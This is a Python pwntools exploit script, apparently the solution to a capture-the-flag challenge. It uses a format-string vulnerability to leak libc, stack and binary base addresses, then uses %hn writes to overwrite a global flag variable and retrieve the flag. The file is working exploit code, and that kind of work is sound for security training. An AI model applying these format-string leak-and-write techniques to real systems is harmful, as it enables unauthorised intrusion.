from pwn import *

HOST = 'chal.amt.rs'
PORT = 1338

exe = ELF('./chal_patched')
libc = ELF('./lib/libc.so.6')

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)  
    else:
        return process([exe.path])

io = start()

# leak libc base 
io.sendlineafter(b': ', b'%3$016lx+++')
io.recvuntil(b'* ')
addr_libc_base = int(io.recvuntil(b'+++')[:-3], 16) - 0x114887
libc.address = addr_libc_base
log.info(f'addr_libc_base = {addr_libc_base: #x}')

# leak stack base
io.sendlineafter(b': ', b'%23$s+++' + pack(libc.sym['environ']))
io.recvuntil(b'* ')
addr_stack_base = unpack(io.recvuntil(b'+++')[:-3].ljust(8, b'\0')) - 0x1e1a8
log.info(f'addr_stack_base = {addr_stack_base: #x}')

# leak binary base
io.sendlineafter(b': ', b'%23$s+++' + pack(addr_stack_base + 0x1bfe8))
io.recvuntil(b'* ')
addr_binary_base = unpack(io.recvuntil(b'+++')[:-3].ljust(8, b'\0')) - 0x1320
log.info(f'addr_binary_base = {addr_binary_base: #x}')

# overwite is_mother_bear
addr_is_mother_bear = addr_binary_base + 0x4044
log.info(f'addr_is_mother_bear = {addr_is_mother_bear: #x}')

fmt = b'%2989c%25$hn%26$hn'
fmt += b'a' * (8 - (len(fmt) % 8))
fmt += pack(addr_is_mother_bear) + pack(addr_is_mother_bear + 2)

io.sendlineafter(b': ', fmt)
io.sendlineafter(b':', b'flag')
io.interactive()